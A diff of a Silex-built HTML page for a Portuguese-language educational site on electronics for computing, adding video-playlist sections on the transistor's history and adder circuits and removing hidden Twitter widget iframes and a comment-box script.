+            </div>
+
+
+
+
+
+
+
+
+
+
+            <div data-silex-type="text" class="editable-style silex-id-1512602324503-0 text-element" data-silex-id="silex-id-1512602324503-0" style="">
+                <div class="silex-element-content normal">
+                    <h1><span style="font-family: Roboto;">Introdução: Primeira Parte.</span></h1>
+                    <p>
+                        <font size="2">Seja bem vindo. Esta sessão é recomendada para quem estiver nos primeiros contatos com o assunto, sem qualquer pré-requisito. Os temas introdutórios da Eletrônica para Computação serão apresentados abaixo em linguagem fácil e interessante.</font><br></p>
+                </div>
+            </div>
+
+
+
+
+            <div data-silex-type="image" class="editable-style silex-id-1512748175545-0 image-element extraInfos" data-silex-id="silex-id-1512748175545-0" style=""><img src="assets/pergunta_e.png" class="silex-element-content"></div>
+            <div data-silex-type="text" class="editable-style silex-id-1512748188765-1 text-element" data-silex-id="silex-id-1512748188765-1" style="">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">
+                        <div style="text-align: center;">
+                            <font size="2"><span style="font-family: georgia, serif;"><b><span style="color: rgb(0, 0, 0);">Pergunta:</span><br></b>
+                                </span>
+                            </font>
+                        </div>
+                        <font size="2"><span style="font-family: georgia, serif;"><b><span style="color: rgb(0, 0, 0);"></span></b>
+                            </span>
+                        </font>
+                    </div>
+                    <div style="text-align: center;">
+                        <font size="2"><span style="font-family: georgia, serif;"><b><span style="color: rgb(0, 0, 0);">Quais as vantagens de reduzir o tamanho dos componentes eletrônicos?</span><br><span style="color: rgb(0, 0, 0);"></span></b>
+                            </span>
+                        </font>
+                    </div>
+                </div>
+            </div>
+
+
+            <div data-silex-type="html" class="editable-style html-element silex-id-1513419957933-0" data-silex-id="silex-id-1513419957933-0" style="">
+                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" eletronica="" master="" index.htmlhttps:="" index.htmlassets="" src="" allowfullscreen="allowfullscreen" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/videoseries?list=PLeH2yLt2MpadUzNZzRBWLePFDQDmlIb54" assets="" height="315" frameborder="0" width="560"></iframe></div>
+            </div>
+            <div data-silex-type="text" class="editable-style silex-id-1513420412673-1 text-element" data-silex-id="silex-id-1513420412673-1" style="">
+                <div class="silex-element-content normal">
+                    <font size="4"><span style="font-family: Oswald;">Sessão 1. Introdução à Eletrônica.<br>Duração: 1 hora e 7 minutos (8 vídeos).<br>Idioma: Português.<br></span></font>
+                </div>
+            </div>
+
+            <div data-silex-type="text" class="editable-style text-element silex-id-1512648637171-0" data-silex-id="silex-id-1512648637171-0" style="">
+                <div class="silex-element-content normal">
+                    <h1><span style="font-family: Roboto;">A História do Transistor<br></span></h1>
+                    <p>
+                        <font size="2">Qual foi o impacto do transistor desde sua invenção até os dias atuais? Estes documentários audiovisuais a seguir mostram acontecimentos históricos com foco em dois países: Japão e Estados Unidos.</font>
+                    </p>
+                </div>
+            </div>
+
+
+            <div data-silex-type="text" class="editable-style text-element silex-id-1513421675934-6" data-silex-id="silex-id-1513421675934-6" style="">
+                <div class="silex-element-content normal">
+                    <font size="4"><span style="font-family: Oswald;">Sessão 2. "A Revolução Tecnológica no Japão"<br>Duração: 2 horas e 40 minutos (3 vídeos).<br>Idioma: Português.<br></span></font>
+                </div>
+            </div>
+
+
+
+            <div data-silex-type="text" class="editable-style text-element silex-id-1512650019349-1" data-silex-id="silex-id-1512650019349-1" style="">
+                <div class="silex-element-content normal">
+                    <h1 style="text-align: center;"><span style="font-family: Roboto;"><u>Lista Resumida</u><br></span></h1>
+                    <p>
+                        <font size="2">Se preferir, ao invés de assistir os 20 vídeos acima, você pode ir direto para a seleção dos melhores, apenas 10 para ter uma ideia geral do assunto. Para acessar a <a href="https://www.youtube.com/watch?v=Szj09sb8uoU&amp;list=PLeH2yLt2MpacUw7WvEnHUlqA3ThI_U3t-">versão resumida da coleção de vídeos, clique aqui.</a>                            Duração total de 222 minutos.</font><br></p>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1513421682255-9" data-silex-id="silex-id-1513421682255-9" style="">
+                <div class="silex-element-content normal">
+                    <font size="4"><span style="font-family: Oswald;">Sessão 3. A Evolução do Transistor nos EUA.<br>Duração: 2 horas e 2 minutos (9 vídeos).<br>Idioma: <b>Inglês.</b><br></span></font>
+                </div>
+            </div>
+            <div data-silex-type="image" class="editable-style image-element silex-id-1513422907692-16" data-silex-id="silex-id-1513422907692-16" style=""><img src="assets/flag-united-states-animation.gif" class="silex-element-content"></div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1513422907649-15" data-silex-id="silex-id-1513422907649-15" style="">
+                <div class="silex-element-content normal">
+                    <h1 style="text-align: center;"><span style="font-family: times new roman, serif;">Nos EUA<br></span></h1>
+                    <h1><span style="font-family: Roboto;"></span></h1>
+                </div>
+            </div>
+            <a data-silex-type="container" class="editable-style container-element silex-id-1513421675987-7" data-silex-id="silex-id-1513421675987-7" style="" href="#!page-guia-2">
+                <div data-silex-type="text" class="editable-style text-element silex-id-1513421675988-8" data-silex-id="silex-id-1513421675988-8" style="">
+                    <div class="silex-element-content normal"><i><font size="6"><span style="font-family: times new roman, serif;"><span style="color: rgb(127, 96, 0);">Ver Detalhes<br></span></span></font></i></div>
+                </div>
+            </a>
+            <a data-silex-type="container" class="editable-style container-element silex-id-1513421682333-10" data-silex-id="silex-id-1513421682333-10" style="" href="#!page-guia-3">
+
+                <div data-silex-type="text" class="editable-style text-element silex-id-1513421682334-11" data-silex-id="silex-id-1513421682334-11" style="">
+                    <div class="silex-element-content normal"><i><font size="6"><span style="font-family: times new roman, serif;"><span style="color: rgb(127, 96, 0);">Ver Detalhes<br></span></span></font></i></div>
+                </div>
+            </a>
+            <a data-silex-type="container" class="editable-style silex-id-1513420786214-2 container-element" data-silex-id="silex-id-1513420786214-2" style="" href="#!page-guia-1">
+                <div data-silex-type="text" class="editable-style silex-id-1513420876420-3 text-element" data-silex-id="silex-id-1513420876420-3" style="">
+                    <div class="silex-element-content normal"><i><font size="6"><span style="font-family: times new roman, serif;"><span style="color: rgb(127, 96, 0);">Ver Detalhes<br></span></span></font></i></div>
+                </div>
+            </a>
+            <div data-silex-type="text" class="editable-style silex-id-1513422799791-13 text-element" data-silex-id="silex-id-1513422799791-13" style="">
+                <div class="silex-element-content normal">
+                    <h1 style="text-align: center;"><span style="font-family: times new roman, serif;">No Japão</span></h1>
+                    <h1><span style="font-family: Roboto;"></span></h1>
+                </div>
+            </div>
+            <div data-silex-type="image" class="editable-style silex-id-1513422851875-14 image-element" data-silex-id="silex-id-1513422851875-14" style=""><img src="assets/flag-japan-animation.gif" class="silex-element-content"></div>
+        </div>
+
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1512056044941-3 section-element paged-element page-somador" data-silex-id="silex-id-1512056044941-3">
+        <div data-silex-type="container" class="editable-style silex-id-1512056044939-2 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1512056044939-2">
+
+
+            <div data-silex-type="html" class="editable-style silex-id-1512558426647-2 html-element" data-silex-id="silex-id-1512558426647-2" style="">
+                <div class="silex-element-content"><iframe https:="" editor.silex.me="" api="" 1.0="" github="" exec="" get="" videos_eletronica="" master="" index.htmlhttps:="" eletronica="" index.htmlassets="" src="" gesture="media" allow="encrypted-media" allowfullscreen="" data-silex-iframe-src="https://www.youtube-nocookie.com/embed/videoseries?list=PLeH2yLt2Mpac72l2fSlggVJey9ZG77uqT" assets="" height="315" frameborder="0" width="560"></iframe></div>
+            </div>
+            <div data-silex-type="image" class="editable-style image-element silex-id-1512921453849-9" data-silex-id="silex-id-1512921453849-9" style=""><img src="assets/site_em_construcao.jpg" class="silex-element-content"></div>
+            <div data-silex-type="text" class="editable-style silex-id-1512558476972-3 text-element" data-silex-id="silex-id-1512558476972-3" style="">
+                <div class="silex-element-content normal">
+                    <h1>Circuitos Somadores</h1>
+                    <p>Nos vídeos acima você verá explicações sobre como computadores somam números, com o meio somador e o somador inteiro.</p>
+                    <p>Os 3 primeiros vídeos são em inglês e mostram através de animações. E também curiosidades, no vídeo da marinha americana - U.S Navy ensinando a fazer o circuito somador, onde aparecem as antigas memória RAM e memória de núcleo magnético.<br></p>
                 </div>
             </div>
         </div>
     </div>
 
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1512056035227-1 section-element paged-element page-somador" data-silex-id="silex-id-1512056035227-1">
+        <div data-silex-type="container" class="editable-style silex-id-1512056035225-0 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1512056035225-0"></div>
+    </div>
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https://editor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
 
-    <iframe scrolling="no" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.36c0c29c73929bf937f4c70adb1a29e4.html?origin=https%3A%2F%2Feditor.silex.me" style="display: none;" frameborder="0"></iframe><iframe id="rufous-sandbox"
-        scrolling="no" allowtransparency="true" allowfullscreen="true" style="position: absolute; visibility: hidden; display: none; width: 0px; height: 0px; padding: 0px; border: medium none;" title="Twitter analytics iframe" frameborder="0"></iframe>
-    <div
-        data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1518469927286-3 section-element page-scrapbook paged-element" data-silex-id="silex-id-1518469927286-3">
-        <div data-silex-type="container" class="editable-style silex-id-1518469927284-2 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1518469927284-2">
-            <div data-silex-type="html" class="editable-style silex-id-1518469857414-1 html-element" data-silex-id="silex-id-1518469857414-1" style="">
-                <div class="silex-element-content">
-                    <!-- begin wwww.htmlcommentbox.com -->
-                    <div id="HCB_comment_box"><a href="http://www.htmlcommentbox.com">Comment Form</a> carregando comentarios...</div>
-                    <link rel="stylesheet" type="text/css" href="//www.htmlcommentbox.com/static/skins/bootstrap/twitter-bootstrap.css?v=0">
-                    <script type="text/javascript" id="hcb">
-                        /*<!--*/ if(!window.hcb_user){hcb_user={};} (function(){var s=document.createElement("script"), l=hcb_user.PAGE || (""+window.location).replace(/'/g,"%27"), h="//www.htmlcommentbox.com";s.setAttribute("type","text/javascript");s.setAttribute("src", h+"/jread?page="+encodeURIComponent(l).replace("+","%2B")+"&mod=%241%24wq1rdBcg%24iVzQ2nEVkZ1R5AMamkGCu0"+"&opts=16862&num=10&ts=1518469502791");if (typeof s!="undefined") document.getElementsByTagName("head")[0].appendChild(s);})(); /*-->*/
-                    </script>
-                    <!-- end www.htmlcommentbox.com -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1512558087225-1 section-element page-somador paged-element" data-silex-id="silex-id-1512558087225-1">
+        <div data-silex-type="container" class="editable-style silex-id-1512558087223-0 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1512558087223-0"></div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490701849669-19 section-element paged-element page-transistor page-circuitos page-hist-ria page-multiplexador page-somador page-guia-1 page-guia-2 page-guia-3" data-silex-id="silex-id-1490701849669-19">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490701849668-18 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490701849668-18">
+            <div data-silex-type="image" class="editable-style silex-id-1513208037766-0 image-element" data-silex-id="silex-id-1513208037766-0" style=""><img src="assets/pergunta_d.png" class="silex-element-content"></div>
+            <div data-silex-type="image" class="editable-style silex-id-1513426177354-20 image-element extraInfos" data-silex-id="silex-id-1513426177354-20" style=""><img src="assets/pnp.gif" class="silex-element-content"></div>
+        </div>
+    </div>
+
+
+
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490693931165-7 section-element paged-element page-videoteca page-introdu-o page-avan-ado page-somador page-multiplexador" data-silex-id="silex-id-1490693931165-7">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490693931163-6 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490693931163-6">
+
+            <div data-silex-type="container" class="editable-style container-element white-bg silex-id-1439554965432-42" data-silex-id="silex-id-1439554965432-42">
+
+
+
+
+
+
+
+
+                <div data-silex-type="container" class="editable-style container-element silex-id-1439554965331-41" data-silex-id="silex-id-1439554965331-41" style="">
+
+
+
+
+
+
+
+                    <a data-silex-type="text" class="editable-style text-element silex-id-1439554965129-39" data-silex-id="silex-id-1439554965129-39" href="#!page-guia-1">
+                        <div class="silex-element-content normal">
+                            <h2 class="heading2">
+                                <span data-offset-key="55v3g-0-0"><span data-text="true">Guia de Videos</span></span>
+                            </h2>
+                        </div>
+                    </a>
+
+                    <a data-silex-type="text" class="editable-style text-element silex-id-1439554965230-40" data-silex-id="silex-id-1439554965230-40" style="" href="#!page-guia-1">
+                        <div class="silex-element-content normal">Clique para acessar detalhes e descrição de cada filme.<br></div>
+                    </a>
+                    <a data-silex-type="image" class="editable-style silex-id-1513636008280-0 image-element" data-silex-id="silex-id-1513636008280-0" style="" href="#!page-guia-1"><img src="assets/fabricacao_chips.gif" class="silex-element-content"></a>
+                </div>
+                <div data-silex-type="container" class="editable-style container-element silex-id-1439554964925-37" data-silex-id="silex-id-1439554964925-37" style="">
+                    <a data-silex-type="text" class="editable-style text-element silex-id-1439554964619-34" data-silex-id="silex-id-1439554964619-34" href="#!page-somador">
+                        <div class="silex-element-content normal">
+                            <h2 class="heading2">Portas Lógicas<br></h2>
+                        </div>
+                    </a>
+
+
+
+
+
+
+                    <a data-silex-type="text" class="editable-style text-element silex-id-1439554964720-35" data-silex-id="silex-id-1439554964720-35" style="" href="#!page-somador">
+                        <div class="silex-element-content normal">
+                            <p class="normal"></p>Aprenda a fazer o circuito somador de números em binário e a ULA (Unidade Lógica Aritmética).<br>
+                            <p class="normal"></p>
+                        </div>
+                    </a>
+
+
+                    <a data-silex-type="image" class="editable-style silex-id-1512337190457-2 image-element" data-silex-id="silex-id-1512337190457-2" style="" href="#!page-somador"><img src="assets/portas_logicas.gif" class="silex-element-content"></a>
+                </div>
+                <div data-silex-type="container" class="editable-style container-element silex-id-1439554964518-33" data-silex-id="silex-id-1439554964518-33" style="">
+
+
+
+
+
+
+
+
+
+
+
+
+                    <a data-silex-type="text" class="editable-style text-element silex-id-1439554964214-30" data-silex-id="silex-id-1439554964214-30" style="" href="#!page-hist-ria">
+                        <div class="silex-element-content normal">
+                            <h2 class="heading2">História <br></h2>
+                        </div>
+                    </a>
+                    <a data-silex-type="text" class="editable-style text-element silex-id-1439554964315-31" data-silex-id="silex-id-1439554964315-31" style="" href="#!page-hist-ria">
+                        <div class="silex-element-content normal">Conheça tecnologias antigas, a eletrônica nos primórdios e os primeiros computadores da década de 1940 e 1950.<br></div>
+                    </a>
+                    <a data-silex-type="image" class="editable-style silex-id-1512322398512-0 image-element" data-silex-id="silex-id-1512322398512-0" style="" href="#!page-hist-ria"><img src="assets/circuito_japao.gif" class="silex-element-content"></a>
+                </div>
+            </div>
+
+
+
+
+            <div data-silex-type="container" class="editable-style container-element silex-id-1439554963707-25" data-silex-id="silex-id-1439554963707-25">
+
+
+
+
+
+
+                <a data-silex-type="text" class="editable-style text-element button-read-more silex-id-1439554963502-23 page-link-active" data-silex-id="silex-id-1439554963502-23" href="#!page-videoteca">
+                    <div class="silex-element-content normal">
+                        <div style="text-align: center;">READ MORE</div>
+                    </div>
+                </a>
+
+                <div data-silex-type="text" class="editable-style text-element silex-id-1439554963605-24" data-silex-id="silex-id-1439554963605-24" style="">
+                    <div class="silex-element-content normal">
+                        <h1 class="heading1">Junho
+                            <font color="#ff9900">13</font>
+                            <font color="#999999">2017</font>
+                        </h1>
+                        <div>
+                            <font color="#999999">
+                                <p class="normal">Teste teste teste.&nbsp;
+                                </p>
+                                <p class="normal">Página em construção.<br></p>
+                            </font>
+                        </div>
+                        <h1 class="heading1"></h1>
+                    </div>
+                </div>
+            </div>
+            <div data-silex-type="container" class="editable-style container-element silex-id-1439554963400-22" data-silex-id="silex-id-1439554963400-22">
+
+
+
+
+
+
+                <a data-silex-type="text" class="editable-style text-element button-read-more silex-id-1439554963198-20" data-silex-id="silex-id-1439554963198-20" href="#!page-introdu-o">
+                    <div class="silex-element-content normal">
+                        <div style="text-align: center;">READ MORE</div>
+                    </div>
+                </a>
+
+            </div>
+            <div data-silex-type="container" class="editable-style container-element silex-id-1439554963096-19" data-silex-id="silex-id-1439554963096-19">
+
+
+
+
+
+
+                <a data-silex-type="text" class="editable-style text-element button-read-more silex-id-1439554962893-17" data-silex-id="silex-id-1439554962893-17" href="#!page-avan-ado">
+                    <div class="silex-element-content normal">
+                        <div style="text-align: center;">READ MORE</div>
+                    </div>
+                </a>
+                <div data-silex-type="text" class="editable-style text-element silex-id-1439554962995-18" data-silex-id="silex-id-1439554962995-18" style="">
+                    <div class="silex-element-content normal">
+                        <h1 class="heading1">Junho
+                            <font color="#ff9900">15</font>
+                            <font color="#999999">2019</font>
+                        </h1>
+                        <div>
+                            <p class="normal">Teste teste teste.&nbsp;
+                            </p>
+                            <p class="normal">Página em construção..</p>
+                        </div>
+                        <h1 class="heading1"></h1>
+                    </div>
+                </div>
+            </div>
+
+
+
+
+
+
+
+
+
+
+
+
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554964011-28 page-link-active" data-silex-id="silex-id-1439554964011-28" style="" href="#!page-videoteca">
+                <div class="silex-element-content normal">
+                    <h1 class="heading1">Pesquisar mais<br></h1>
+                    <h1 class="heading1"></h1>
+                </div>
+            </a>
+
+            <div data-silex-type="text" class="editable-style text-element silex-id-1439554964112-29" data-silex-id="silex-id-1439554964112-29" style="">
+                <div class="silex-element-content normal">
+                    <p class="normal"><i></i>
+                    </p>
+                    <p class="normal"><i>No DECOM aprendemos no primeiro semestre a Eletrônica para Computação, uma ciência da área de exatas baseada principalmente na lógica matemática. Partindo de simples fios e chaves de ligar e desligar, que são feitas por transistores, podemos formar circuitos com funções mais elaboradas, até o registrador: de onde surgem os 0 e 1 do código binário usado na computação.<br></i></p>
+                    <p class="normal"></p>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1439554963809-26" data-silex-id="silex-id-1439554963809-26" style="">
+                <div class="silex-element-content normal">
+                    <div>
+                        <font size="7"><br></font>
+                    </div>
+                    <font size="7">”</font>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1439554963298-21" data-silex-id="silex-id-1439554963298-21" style="">
+                <div class="silex-element-content normal">
+                    <h1 class="heading1">Junho
+                        <font color="#ff9900">14</font>
+                        <font color="#999999">2018</font>
+                    </h1>
+                    <div>
+                        <p class="normal">Teste teste teste.&nbsp;
+                        </p>
+                        <p class="normal">Página em construção.</p>
+                    </div>
+                    <h1 class="heading1"></h1>
+                </div>
+            </div>
+            <div data-silex-type="text" class="editable-style text-element silex-id-1439554963909-27" data-silex-id="silex-id-1439554963909-27" style="">
+                <div class="silex-element-content normal">
+                    <div>
+                        <font size="7"><br></font>
+                    </div>
+                    <font size="7">“</font>
                 </div>
             </div>
         </div>
-        </div>
-</body>
 
-</html>
+    </div>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1490694042605-9 section-element" data-silex-id="silex-id-1490694042605-9">
+        <div data-silex-type="container" class="editable-style silex-element-content website-width silex-id-1490694042604-8 silex-container-content container-element prevent-draggable" data-silex-id="silex-id-1490694042604-8">
+            <div data-silex-type="image" class="editable-style silex-id-1512341508054-6 image-element" data-silex-id="silex-id-1512341508054-6" style=""><img src="assets/titulo.png" class="silex-element-content"></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554961739-6 nav hide-on-mobile nav-mark page-link-active" data-silex-id="silex-id-1439554961739-6" style="" href="#!page-videoteca">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">iniciar</div>
+                </div>
+            </a>
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554961840-7 nav hide-on-mobile nav-mark" data-silex-id="silex-id-1439554961840-7" style="" href="#!page-transistor">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">transistor</div>
+                </div>
+            </a>
+
+
+
+
+
+
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554961964-8 nav hide-on-mobile nav-mark" data-silex-id="silex-id-1439554961964-8" style="" href="#!page-circuitos">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">circuitos</div>
+                </div>
+            </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554962181-10 nav hide-on-mobile nav-mark" data-silex-id="silex-id-1439554962181-10" style="" href="#!page-pr-ticas">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">Práticas</div>
+                </div>
+            </a>
+            <a data-silex-type="text" class="editable-style text-element silex-id-1439554962078-9 nav hide-on-mobile nav-mark" data-silex-id="silex-id-1439554962078-9" style="" href="#!page-hist-ria">
+                <div class="silex-element-content normal">
+                    <div style="text-align: center;">história</div>
+                </div>
+            </a>
+            <div data-silex-type="image" class="editable-style silex-id-1513121569809-1 image-element page-videoteca paged-element page-introdu-o page-avan-ado" data-silex-id="silex-id-1513121569809-1" style=""><img src="assets/ufop-icon-pb.png" class="silex-element-content"></div>
+            <div data-silex-type="image" class="editable-style silex-id-1513421725637-12 image-element page-videoteca paged-element page-introdu-o page-avan-ado" data-silex-id="silex-id-1513421725637-12" style=""><img src="assets/flag-brazil-animation.gif" class="silex-element-content"></div>
+        </div>
+
+    </div>
+    <div data-silex-type="container" class="prevent-draggable container-element editable-style silex-id-1511908704824-3 section-element hide-on-mobile page-videoteca paged-element page-introdu-o page-avan-ado" data-silex-id="silex-id-1511908704824-3">
+        <div data-silex-type="container" class="editable-style silex-id-1511908704822-2 container-element silex-element-content silex-container-content website-width prevent-draggable" data-silex-id="silex-id-1511908704822-2">
+
+
+
+
+
+
+
+
+
+
+
+            <a target="_blank" data-silex-type="image" class="editable-style silex-id-1512323169138-0 image-element hide-on-mobile" data-silex-id="silex-id-1512323169138-0" style="" href="//www.decom.ufop.br/"><img src="assets/ufop-icon.png" class="silex-element-content"></a>
+            <a target="_blank" data-silex-type="image" class="editable-style image-element silex-id-1512592057686-0" data-silex-id="silex-id-1512592057686-0" style="" href="//www.decom.ufop.br/"><img src="assets/decom-icon.png" class="silex-element-content"></a>
+            <div data-silex-type="container" class="editable-style silex-id-1513121965044-2 container-element" data-silex-id="silex-id-1513121965044-2" style="">
+                <div data-silex-type="text" class="editable-style text-element silex-id-1439554962792-16 hide-on-mobile" data-silex-id="silex-id-1439554962792-16" style="">
+                    <div class="silex-element-content normal">
+                        <div style="text-align: left;"><b><font size="2">
+
+
+                    </font></b></div>
+                        <div style="text-align: left;"><b><font size="2"><a href="//www.silex.me">Web desing com aplicativo Silex.</a></font></b></div>
+                        <div style="text-align: left;"><b><font size="2">
+                    </font></b></div>
+                        <div style="text-align: left;"><b><font size="2"><a href="https://github.com/">Hospedado no GitHub.</a></font></b></div>
+                        <div style="text-align: left;"><b><font size="2"><a href="https://www.youtube.com/channel/UC1LKjU81at76qlgj8CZlwWg">Canal do Youtube.</a></font></b></div>
+                        <div style="text-align: left;"><b><font size="2">
+                    </font></b></div>
+                        <div style="text-align: left;">
+                            <b><font size="2"><a href="https://github.com/"> </a><br></font></b>
+                        </div><b><font size="2">
+                </font></b></div>
+                </div>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1512219922370-2 image-element hide-on-mobile" data-silex-id="silex-id-1512219922370-2" style="" href="https://www.youtube.com/channel/UC1LKjU81at76qlgj8CZlwWg"><img src="assets/YouTube-icon.png" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style image-element silex-id-1439554962488-13 hide-on-mobile" data-silex-id="silex-id-1439554962488-13" style="" href="https://github.com/barbolux/eletronica">
+                    <img src="assets/GitHub-icon.png" class="silex-element-content"></a>
+                <a target="_blank" data-silex-type="image" class="editable-style silex-id-1512341968008-7 image-element hide-on-mobile" data-silex-id="silex-id-1512341968008-7" style="" href="https://www.silexlabs.org/silex/"><img src="assets/silex-icon.png" class="silex-element-content"></a>
+
+
+
+
+                <div data-silex-type="text" class="editable-style text-element silex-id-1439554962283-11" data-silex-id="silex-id-1439554962283-11" style="">
+                    <div class="silex-element-content normal">
+                        <font size="6"><br>Sobre
+                            <font color="#999999">este site</font>
+                        </font>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html>
